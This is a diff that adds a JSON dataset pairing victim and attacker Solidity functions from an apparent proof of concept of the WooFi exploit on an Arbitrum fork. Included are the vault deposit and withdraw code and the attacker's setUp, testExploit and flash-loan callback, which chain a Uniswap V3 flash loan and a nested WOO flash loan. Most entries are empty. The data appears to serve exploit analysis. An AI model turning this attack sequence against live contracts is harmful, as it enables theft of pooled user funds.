@@ -1,0 +1,240 @@
+[
+  {
+    "contract/interface": "IWooPPV2",
+    "source_type": "victim_contract",
+    "function_name": "poolSize",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWooPPV2",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISilo",
+    "source_type": "victim_contract",
+    "function_name": "borrow",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISilo",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "    function deposit(uint256 amount) public payable override nonReentrant {\n        if (amount == 0) {\n            return;\n        }\n\n        if (want == weth) {\n            require(msg.value == amount, \"WOOFiVaultV2: msg.value_INSUFFICIENT\");\n        } else {\n            require(msg.value == 0, \"WOOFiVaultV2: msg.value_INVALID\");\n        }\n\n        if (address(strategy) != address(0)) {\n            require(!strategy.paused(), \"WOOFiVaultV2: strat_paused\");\n            strategy.beforeDeposit();\n        }\n\n        uint256 balanceBefore = balance();\n        if (want == weth) {\n            IWETH(weth).deposit{value: msg.value}();\n        } else {\n            TransferHelper.safeTransferFrom(want, msg.sender, address(this), amount);\n        }\n        uint256 balanceAfter = balance();\n        require(amount <= balanceAfter - balanceBefore, \"WOOFiVaultV2: amount_NOT_ENOUGH\");\n\n        uint256 shares = totalSupply() == 0 ? amount : (amount * totalSupply()) / balanceBefore;\n        require(shares > 0, \"VaultV2: !shares\");\n        uint256 sharesBefore = balanceOf(msg.sender);\n        uint256 costBefore = costSharePrice[msg.sender];\n        uint256 costAfter = (sharesBefore * costBefore + amount * 1e18) / (sharesBefore + shares);\n        costSharePrice[msg.sender] = costAfter;\n\n        _mint(msg.sender, shares);\n\n        earn();\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISilo",
+    "source_type": "victim_contract",
+    "function_name": "liquidity",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISilo",
+    "source_type": "victim_contract",
+    "function_name": "repay",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ISilo",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "    function withdraw(uint256 shares) public override nonReentrant {\n        if (shares == 0) {\n            return;\n        }\n\n        require(shares <= balanceOf(msg.sender), \"WOOFiVaultV2: shares_NOT_ENOUGH\");\n\n        if (address(strategy) != address(0)) {\n            strategy.beforeWithdraw();\n        }\n\n        uint256 withdrawAmount = (shares * balance()) / totalSupply();\n        _burn(msg.sender, shares);\n\n        uint256 balanceBefore = IERC20(want).balanceOf(address(this));\n        if (balanceBefore < withdrawAmount) {\n            uint256 balanceToWithdraw = withdrawAmount - balanceBefore;\n            require(_isStratActive(), \"WOOFiVaultV2: STRAT_INACTIVE\");\n            strategy.withdraw(balanceToWithdraw);\n            uint256 balanceAfter = IERC20(want).balanceOf(address(this));\n            if (withdrawAmount > balanceAfter) {\n                // NOTE: in case a small amount not counted in, due to the decimal precision.\n                withdrawAmount = balanceAfter;\n            }\n        }\n\n        if (want == weth) {\n            IWETH(weth).withdraw(withdrawAmount);\n            TransferHelper.safeTransferETH(msg.sender, withdrawAmount);\n        } else {\n            TransferHelper.safeTransfer(want, msg.sender, withdrawAmount);\n        }\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ILBTFlashloan",
+    "source_type": "victim_contract",
+    "function_name": "flashLoan",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "LBFlashLoanCallback",
+    "original_code": "    function LBFlashLoanCallback(\n        address sender,\n        IERC20 tokenX,\n        IERC20 tokenY,\n        bytes32 amounts,\n        bytes32 totalFees,\n        bytes calldata data\n    ) external returns (bytes32);\n}\n\ninterface ISilo {\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "LBT",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "Silo",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "USDCe",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "Univ3pool",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "WETH",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "WOO",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "WooPPV2",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "WooracleV2",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 187_381_784);\n        vm.label(address(USDCe), \"USDCe\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(WOO), \"WOO\");\n        vm.label(address(LBT), \"LBT\");\n        vm.label(address(WooracleV2), \"WooracleV2\");\n        vm.label(address(Silo), \"Silo\");\n        vm.label(address(Univ3pool), \"Univ3pool\");\n        vm.label(address(WooPPV2), \"WooPPV2\");\n        vm.label(address(this), \"Attacker\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        WOO.approve(WooPPV2, type(uint256).max);\n        WOO.approve(Silo, type(uint256).max);\n        USDCe.approve(WooPPV2, type(uint256).max);\n        USDCe.approve(Silo, type(uint256).max);\n\n        uni_flash_amount = USDCe.balanceOf(Univ3pool) - 10_000_000_000;\n        IUniswapV3Flash(Univ3pool).flash(address(this), 0, uni_flash_amount, new bytes(1));\n\n        console.log(\"USDCe after hack: %s\", USDCe.balanceOf(address(this)));\n        console.log(\"WOO after hack: %s\", WOO.balanceOf(address(this)));\n        console.log(\"WETH after hack: %s\", WETH.balanceOf(address(this)));\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "uni_flash_amount",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3FlashCallback",
+    "original_code": "    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {\n        uint256 weth_amount = WETH.balanceOf(address(this));\n        uint256 usdc_amount = USDCe.balanceOf(address(this));\n        woo_lbt_amount = WOO.balanceOf(LBT) - 100;\n\n        ILBTFlashloan(LBT).flashLoan(\n            ILBFlashLoanCallback(address(this)),\n            bytes32(woo_lbt_amount),\n            abi.encodePacked(bytes32(woo_lbt_amount), bytes32(0))\n        );\n\n        USDCe.transfer(Univ3pool, uni_flash_amount + amount1);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "Woofi_exp",
+    "source_type": "attacker_contract",
+    "function_name": "woo_lbt_amount",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IWooracleV2",
+    "source_type": "victim_contract",
+    "function_name": "state",
+    "original_code": "",
+    "description": ""
+  }
+]
